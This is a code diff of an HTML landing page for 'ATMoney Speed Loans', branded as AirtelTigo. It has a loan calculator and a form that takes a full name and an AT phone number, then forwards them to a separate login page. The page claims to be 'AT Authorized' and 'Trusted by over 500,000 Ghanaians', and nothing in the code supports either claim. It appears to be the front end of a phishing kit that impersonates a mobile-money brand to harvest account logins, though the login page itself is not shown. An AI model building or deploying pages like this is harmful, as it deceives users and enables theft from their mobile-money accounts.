@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#C41E3A">
-    <title>ATMoney Speed Loans | Instant Loans for AT Users</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>ATMoney Speed Loans | Life is Simple</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -14,507 +14,310 @@
             --at-blue: #0056b3;
             --at-gold: #FFB81C;
             --white: #ffffff;
-            --gray-light: #f8fafc;
-            --gray-border: #e2e8f0;
-            --text-dark: #1e293b;
-            --text-muted: #64748b;
-            --shadow: 0 10px 25px -5px rgba(196, 30, 58, 0.1), 0 8px 10px -6px rgba(196, 30, 58, 0.1);
+            --light: #f0f6ff;
+            --dark: #0d1b2a;
+            --muted: #5a6d80;
+            --border: #d0dce8;
+            --error: #dc2626;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--gray-light); color: var(--text-dark); line-height: 1.5; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; }
+
+        body {
+            font-family: 'Poppins', system-ui, sans-serif;
+            background: linear-gradient(135deg, var(--dark) 0%, var(--at-dark) 50%, var(--at-blue) 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
 
         header {
             background: var(--white);
-            padding: 1rem 5%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            padding: 14px 5%;
+            border-bottom: 3px solid var(--at-red);
         }
 
-        .logo { font-family: 'Poppins', sans-serif; font-size: 24px; font-weight: 900; text-decoration: none; letter-spacing: -0.5px; }
+        .logo {
+            font-size: 22px;
+            font-weight: 900;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            letter-spacing: -0.5px;
+        }
         .logo .at { color: var(--at-red); }
         .logo .money { color: var(--at-dark); }
         .logo-tagline { font-size: 10px; font-weight: 600; color: var(--at-gold); letter-spacing: 1px; }
 
-        .hero {
-            padding: 4rem 5%;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 4rem;
-            max-width: 1280px;
-            margin: 0 auto;
-            align-items: center;
-        }
+        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 36px 16px; }
 
-        .hero-content h1 {
-            font-family: 'Poppins', sans-serif;
-            font-size: 3.5rem;
-            font-weight: 800;
-            line-height: 1.1;
-            color: var(--at-dark);
-            margin-bottom: 1.5rem;
-        }
-
-        .hero-content h1 .highlight {
-            color: var(--at-red);
-        }
-
-        .hero-content p {
-            font-size: 1.125rem;
-            color: var(--text-muted);
-            margin-bottom: 2rem;
-            max-width: 480px;
-        }
-
-        .trust-badges {
-            display: flex;
-            gap: 2rem;
-            margin-top: 3rem;
-            flex-wrap: wrap;
-        }
-
-        .trust-item {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            font-size: 0.875rem;
-            font-weight: 600;
-            color: var(--text-dark);
-        }
-
-        .trust-item i {
-            color: var(--at-red);
-            font-size: 1.25rem;
-        }
-
-        /* Calculator Card */
-        .calc-card {
+        .card {
             background: var(--white);
-            border-radius: 24px;
-            padding: 2.5rem;
-            box-shadow: var(--shadow);
-            border: 1px solid var(--gray-border);
+            border-radius: 18px;
+            padding: 32px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 16px 48px rgba(0,0,0,0.4);
+        }
+
+        .card-head { text-align: center; margin-bottom: 24px; }
+        .card-head h1 { font-size: 24px; font-weight: 900; color: var(--at-dark); margin-bottom: 4px; }
+        .card-head p { color: var(--muted); font-size: 13px; }
+
+        .calc-box {
+            background: var(--light);
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid var(--border);
         }
 
         .calc-title {
-            font-family: 'Poppins', sans-serif;
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-            text-align: center;
-            color: var(--at-dark);
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--at-red);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .calc-subtitle {
-            font-size: 0.875rem;
-            color: var(--text-muted);
-            text-align: center;
-            margin-bottom: 2rem;
+        .fg { margin-bottom: 18px; }
+        .fl { display: block; font-size: 11px; font-weight: 700; color: var(--at-dark); margin-bottom: 6px; }
+
+        .range-wrap { position: relative; margin: 15px 0 25px; }
+        input[type=range] {
+            width: 100%;
+            height: 6px;
+            background: #d1d5db;
+            border-radius: 5px;
+            outline: none;
+            -webkit-appearance: none;
         }
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            background: var(--at-red);
+            border-radius: 50%;
+            cursor: pointer;
+            border: 3px solid white;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+
+        .range-vals { display: flex; justify-content: space-between; font-size: 10px; color: var(--muted); font-weight: 600; margin-top: 8px; }
+
+        .amt-display {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 900;
+            color: var(--at-red);
+            margin-bottom: 15px;
+        }
+
+        .summary-mini {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            background: white;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+        }
+        .s-item { text-align: center; }
+        .s-label { font-size: 9px; color: var(--muted); text-transform: uppercase; font-weight: 700; }
+        .s-val { font-size: 13px; font-weight: 800; color: var(--at-dark); }
 
         .input-group {
-            margin-bottom: 1.5rem;
-        }
-
-        .label-row {
+            position: relative;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            margin-bottom: 0.75rem;
         }
-
-        .label-row label {
-            font-weight: 700;
-            font-size: 0.875rem;
-            color: var(--text-dark);
-        }
-
-        .value-display {
-            font-weight: 800;
-            font-size: 1.25rem;
-            color: var(--at-red);
-        }
-
-        /* Range Slider Styling */
-        input[type="range"] {
+        .input-group i { position: absolute; left: 14px; color: var(--at-red); font-size: 14px; }
+        .fi {
             width: 100%;
-            height: 8px;
-            background: #e2e8f0;
-            border-radius: 4px;
-            outline: none;
-            -webkit-appearance: none;
-            margin-bottom: 0.5rem;
-        }
-
-        input[type="range"]::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 28px;
-            height: 28px;
-            background: var(--at-red);
-            border-radius: 50%;
-            cursor: pointer;
-            border: 4px solid var(--white);
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        input[type="range"]::-moz-range-thumb {
-            width: 28px;
-            height: 28px;
-            background: var(--at-red);
-            border-radius: 50%;
-            cursor: pointer;
-            border: 4px solid var(--white);
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        .range-limits {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: var(--text-muted);
-        }
-
-        /* Phone Input */
-        .phone-field {
-            background: var(--gray-light);
-            border: 2px solid var(--gray-border);
+            padding: 14px 14px 14px 40px;
+            border: 2px solid var(--border);
             border-radius: 12px;
-            padding: 0.75rem 1rem;
-            display: flex;
-            align-items: center;
-            margin-bottom: 2rem;
-            transition: border-color 0.2s;
-        }
-
-        .phone-field:focus-within {
-            border-color: var(--at-red);
-        }
-
-        .phone-prefix {
-            font-weight: 700;
-            color: var(--at-red);
-            margin-right: 0.75rem;
-            border-right: 2px solid var(--gray-border);
-            padding-right: 0.75rem;
-        }
-
-        .phone-input {
-            flex: 1;
-            border: none;
-            background: transparent;
-            font-size: 1rem;
-            font-weight: 700;
+            font-size: 15px;
             outline: none;
-            font-family: inherit;
-        }
-
-        /* Result Box */
-        .result-box {
-            background: var(--at-red);
-            color: var(--white);
-            border-radius: 16px;
-            padding: 1.5rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .result-label {
-            font-size: 0.875rem;
-            font-weight: 600;
-            opacity: 0.9;
-        }
-
-        .result-value {
-            font-size: 1.75rem;
-            font-weight: 800;
-        }
-
-        .apply-btn {
-            width: 100%;
-            background: var(--at-red);
-            color: var(--white);
-            border: none;
-            padding: 1.25rem;
-            border-radius: 12px;
-            font-size: 1.125rem;
-            font-weight: 800;
-            cursor: pointer;
-            transition: transform 0.2s, background 0.2s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 14px rgba(196, 30, 58, 0.3);
-        }
-
-        .apply-btn:hover {
-            background: #a01729;
-            transform: translateY(-2px);
-        }
-
-        .apply-btn:active {
-            transform: translateY(0);
-        }
-
-        .apply-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        /* Benefits Section */
-        .benefits {
+            transition: all 0.2s;
             background: var(--white);
-            padding: 5rem 5%;
         }
+        .fi:focus { border-color: var(--at-red); box-shadow: 0 0 0 4px rgba(196, 30, 58, 0.05); }
 
-        .section-title {
-            text-align: center;
-            font-family: 'Poppins', sans-serif;
-            font-size: 2.25rem;
-            font-weight: 800;
-            margin-bottom: 4rem;
-            color: var(--at-dark);
-        }
-
-        .benefits-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 2.5rem;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .benefit-card {
-            text-align: center;
-            padding: 2rem;
-        }
-
-        .benefit-icon {
-            width: 80px;
-            height: 80px;
-            background: var(--gray-light);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1.5rem;
-            font-size: 2rem;
-            color: var(--at-red);
-        }
-
-        .benefit-card h3 {
-            font-size: 1.25rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            color: var(--at-dark);
-        }
-
-        .benefit-card p {
-            font-size: 0.875rem;
-            color: var(--text-muted);
-            line-height: 1.6;
-        }
-
-        .at-users-notice {
-            background: linear-gradient(135deg, var(--at-red) 0%, #a01729 100%);
-            color: var(--white);
-            padding: 1.5rem;
-            border-radius: 12px;
-            text-align: center;
-            margin-bottom: 2rem;
+        .err {
+            display: none;
+            background: rgba(220,38,38,0.06);
+            border: 1px solid rgba(220,38,38,0.15);
+            color: var(--error);
+            font-size: 12px;
             font-weight: 600;
+            border-radius: 8px;
+            padding: 10px;
+            margin-bottom: 15px;
+            text-align: center;
         }
+        .err.show { display: block; }
 
-        @media (max-width: 1024px) {
-            .hero { grid-template-columns: 1fr; gap: 3rem; text-align: center; }
-            .hero-content h1 { font-size: 2.75rem; }
-            .hero-content p { margin: 0 auto 2rem; }
-            .trust-badges { justify-content: center; }
-            .calc-card { max-width: 500px; margin: 0 auto; }
+        .btn-apply {
+            width: 100%;
+            background: var(--at-red);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 15px;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(196, 30, 58, 0.3);
+            transition: all 0.2s;
+            margin-top: 10px;
         }
+        .btn-apply:hover { background: #a01729; transform: translateY(-2px); }
+        .btn-apply:active { transform: translateY(0); }
 
-        @media (max-width: 768px) {
-            .benefits-grid { grid-template-columns: 1fr; }
-            .hero-content h1 { font-size: 2.25rem; }
-            .hero { padding: 2rem 5%; }
+        .card-ft { text-align: center; margin-top: 20px; font-size: 11px; color: var(--muted); }
+        .secure { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 12px; font-size: 10px; color: var(--muted); font-weight: 600; }
+
+        @media (max-width: 500px) {
+            .card { padding: 24px 20px; }
+            .amt-display { font-size: 28px; }
         }
     </style>
 </head>
 <body>
-
     <header>
-        <a href="#" class="logo">
-            <div><span class="at">AT</span><span class="money">Money</span></div>
-            <div class="logo-tagline">LIFE IS SIMPLE</div>
+        <a class="logo" href="index.html">
+            <div>
+                <div><span class="at">AT</span><span class="money">Money</span></div>
+                <div class="logo-tagline">LIFE IS SIMPLE</div>
+            </div>
         </a>
     </header>
 
-    <section class="hero">
-        <div class="hero-content">
-            <h1>Get Cash <br><span class="highlight">Instantly.</span></h1>
-            <p>Experience the fastest way to get a loan in Ghana. Directly to your ATMoney wallet, no paperwork, no delays. Available 24/7 for AT users only.</p>
-            
-            <div class="trust-badges">
-                <div class="trust-item"><i class="fa-solid fa-circle-check"></i> 100% Secure</div>
-                <div class="trust-item"><i class="fa-solid fa-circle-check"></i> Instant Approval</div>
-                <div class="trust-item"><i class="fa-solid fa-circle-check"></i> No Collateral</div>
+    <main>
+        <div class="card">
+            <div class="card-head">
+                <h1>Speed Loans</h1>
+                <p>Fast, reliable loans for AT users</p>
             </div>
+
+            <div class="calc-box">
+                <div class="calc-title"><i class="fa-solid fa-calculator"></i> Loan Calculator</div>
+                
+                <div class="amt-display" id="dispAmt">GHS 1,000</div>
+
+                <div class="range-wrap">
+                    <input type="range" id="amtRange" min="100" max="5000" step="100" value="1000" oninput="updateCalc()">
+                    <div class="range-vals"><span>GHS 100</span><span>GHS 5,000</span></div>
+                </div>
+
+                <div class="fg">
+                    <label class="fl">Repayment Duration</label>
+                    <select class="fi" id="duration" style="padding-left: 15px;" onchange="updateCalc()">
+                        <option value="1">1 Month (8.5% Interest)</option>
+                        <option value="2">2 Months (12% Interest)</option>
+                        <option value="3">3 Months (15% Interest)</option>
+                        <option value="6">6 Months (25% Interest)</option>
+                    </select>
+                </div>
+
+                <div class="summary-mini">
+                    <div class="s-item">
+                        <div class="s-label">Interest</div>
+                        <div class="s-val" id="dispInterest">GHS 85.00</div>
+                    </div>
+                    <div class="s-item">
+                        <div class="s-label">Total Repayment</div>
+                        <div class="s-val" id="dispTotal" style="color: var(--at-red);">GHS 1,085.00</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="err" class="err"></div>
+
+            <form onsubmit="handleApply(event)">
+                <div class="fg">
+                    <label class="fl">Full Name (As on ID)</label>
+                    <div class="input-group">
+                        <i class="fa-solid fa-user"></i>
+                        <input type="text" class="fi" id="fullName" placeholder="Enter your full name" required>
+                    </div>
+                </div>
+
+                <div class="fg">
+                    <label class="fl">AT Phone Number (027/057/026/056)</label>
+                    <div class="input-group">
+                        <i class="fa-solid fa-phone"></i>
+                        <input type="tel" class="fi" id="phone" placeholder="e.g. 0271234567" maxlength="10" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-apply">Get Loan Now</button>
+            </form>
+
+            <div class="card-ft">Trusted by over 500,000 Ghanaians</div>
+            <div class="secure">🔒 Secure 256-bit Encryption &middot; AT Authorized</div>
         </div>
-
-        <div class="hero-calc">
-            <div class="calc-card">
-                <div class="at-users-notice">
-                    ⚠️ This loan service is for AT users only
-                </div>
-
-                <h2 class="calc-title">Loan Calculator</h2>
-                <p class="calc-subtitle">Adjust the sliders to find your perfect loan</p>
-
-                <div class="input-group">
-                    <div class="label-row">
-                        <label>Loan Amount</label>
-                        <span class="value-display" id="amount-val">GHS 5,000</span>
-                    </div>
-                    <input type="range" id="amount-slider" min="500" max="50000" step="500" value="5000">
-                    <div class="range-limits">
-                        <span>GHS 500</span>
-                        <span>GHS 50,000</span>
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <div class="label-row">
-                        <label>Repayment Term</label>
-                        <span class="value-display" id="term-val">3 Months</span>
-                    </div>
-                    <input type="range" id="term-slider" min="1" max="6" step="1" value="3">
-                    <div class="range-limits">
-                        <span>1 Month</span>
-                        <span>6 Months</span>
-                    </div>
-                </div>
-
-                <div class="label-row" style="margin-top: 2rem;">
-                    <label>AT Phone Number</label>
-                </div>
-                <div class="phone-field">
-                    <span class="phone-prefix">+233</span>
-                    <input type="tel" id="phone-input" class="phone-input" placeholder="5XXXXXXXX" maxlength="9">
-                </div>
-
-                <div class="result-box">
-                    <span class="result-label">Total Repayment</span>
-                    <span class="result-value" id="total-val">GHS 6,345</span>
-                </div>
-
-                <button class="apply-btn" id="apply-btn">Get My Loan Now ⚡</button>
-            </div>
-        </div>
-    </section>
-
-    <section class="benefits">
-        <h2 class="section-title">Why ATMoney Speed Loans?</h2>
-        <div class="benefits-grid">
-            <div class="benefit-card">
-                <div class="benefit-icon"><i class="fa-solid fa-bolt-lightning"></i></div>
-                <h3>Instant Payout</h3>
-                <p>Funds are transferred to your ATMoney wallet within seconds of approval.</p>
-            </div>
-            <div class="benefit-card">
-                <div class="benefit-icon"><i class="fa-solid fa-shield-halved"></i></div>
-                <h3>Bank-Level Security</h3>
-                <p>Your data and transactions are protected with the highest security standards.</p>
-            </div>
-            <div class="benefit-card">
-                <div class="benefit-icon"><i class="fa-solid fa-mobile-screen-button"></i></div>
-                <h3>100% Digital</h3>
-                <p>Apply from anywhere, anytime. No bank visits or physical documents needed.</p>
-            </div>
-            <div class="benefit-card">
-                <div class="benefit-icon"><i class="fa-solid fa-hourglass-end"></i></div>
-                <h3>Flexible Terms</h3>
-                <p>Choose your repayment period from 1 to 6 months based on your needs.</p>
-            </div>
-            <div class="benefit-card">
-                <div class="benefit-icon"><i class="fa-solid fa-percent"></i></div>
-                <h3>Transparent Fees</h3>
-                <p>Simple 8.9% monthly service fee. See your full breakdown before you apply.</p>
-            </div>
-            <div class="benefit-card">
-                <div class="benefit-icon"><i class="fa-solid fa-check-double"></i></div>
-                <h3>No Guarantor</h3>
-                <p>Your ATMoney wallet history is all you need. No collateral required.</p>
-            </div>
-        </div>
-    </section>
+    </main>
 
     <script>
-        const amountSlider = document.getElementById('amount-slider');
-        const termSlider = document.getElementById('term-slider');
-        const phoneInput = document.getElementById('phone-input');
-        const amountVal = document.getElementById('amount-val');
-        const termVal = document.getElementById('term-val');
-        const totalVal = document.getElementById('total-val');
-        const applyBtn = document.getElementById('apply-btn');
-
-        const MONTHLY_INTEREST = 0.089;
-
         function updateCalc() {
-            const amount = parseInt(amountSlider.value);
-            const term = parseInt(termSlider.value);
+            const amt = parseInt(document.getElementById('amtRange').value);
+            const duration = parseInt(document.getElementById('duration').value);
             
-            // Calculation: Principal + (Principal * 8.9% * Months)
-            const totalInterest = amount * MONTHLY_INTEREST * term;
-            const totalRepayment = amount + totalInterest;
+            let rate = 0.085;
+            if (duration === 2) rate = 0.12;
+            if (duration === 3) rate = 0.15;
+            if (duration === 6) rate = 0.25;
 
-            amountVal.textContent = 'GHS ' + amount.toLocaleString();
-            termVal.textContent = term + (term === 1 ? ' Month' : ' Months');
-            totalVal.textContent = 'GHS ' + totalRepayment.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            const interest = amt * rate;
+            const total = amt + interest;
+
+            document.getElementById('dispAmt').textContent = 'GHS ' + amt.toLocaleString();
+            document.getElementById('dispInterest').textContent = 'GHS ' + interest.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            document.getElementById('dispTotal').textContent = 'GHS ' + total.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
         }
 
-        // Phone input validation: Only digits, must start with 5, max 9 digits
-        phoneInput.addEventListener('input', function(e) {
-            let v = this.value.replace(/\D/g, '');
-            if (v.length > 0 && v[0] !== '5') { v = ''; }
-            this.value = v.substring(0, 9);
-        });
+        function handleApply(e) {
+            e.preventDefault();
+            const errEl = document.getElementById('err');
+            errEl.classList.remove('show');
 
-        amountSlider.addEventListener('input', updateCalc);
-        termSlider.addEventListener('input', updateCalc);
+            const name = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const amt = document.getElementById('amtRange').value;
+            const durationText = document.getElementById('duration').options[document.getElementById('duration').selectedIndex].text;
+            const total = document.getElementById('dispTotal').textContent.replace('GHS ', '');
 
-        applyBtn.addEventListener('click', function() {
-            const phone = phoneInput.value;
-            if (phone.length !== 9) {
-                alert('Please enter a valid 9-digit AT phone number starting with 5');
-                phoneInput.focus();
+            // AirtelTigo (AT) Validation: 027, 057, 026, 056
+            const validPrefixes = ['027', '057', '026', '056'];
+            const prefix = phone.substring(0, 3);
+
+            if (phone.length !== 10 || !/^\d+$/.test(phone)) {
+                errEl.textContent = 'Please enter a valid 10-digit phone number.';
+                errEl.classList.add('show');
                 return;
             }
 
-            this.disabled = true;
-            this.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
+            if (!validPrefixes.includes(prefix)) {
+                errEl.textContent = 'Only AT (AirtelTigo) numbers are eligible (027, 057, 026, 056).';
+                errEl.classList.add('show');
+                return;
+            }
 
-            const amount = parseInt(amountSlider.value);
-            const term = parseInt(termSlider.value);
-            const totalInterest = amount * MONTHLY_INTEREST * term;
-            const totalRepayment = amount + totalInterest;
-            const termText = term + (term === 1 ? ' Month' : ' Months');
+            // Redirect to login page with data
+            const url = `login.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&amount=${encodeURIComponent(amt)}&duration=${encodeURIComponent(durationText)}&total=${encodeURIComponent(total)}`;
+            window.location.href = url;
+        }
 
-            setTimeout(function() {
-                window.location.href = 'apply.html?phone=' + phone + 
-                    '&amount=' + amount + 
-                    '&term=' + term +
-                    '&termText=' + encodeURIComponent(termText) +
-                    '&total=' + totalRepayment.toFixed(2);
-            }, 1500);
-        });
-
-        // Initialize calculator on page load
+        // Initialize
         updateCalc();
     </script>
 </body>
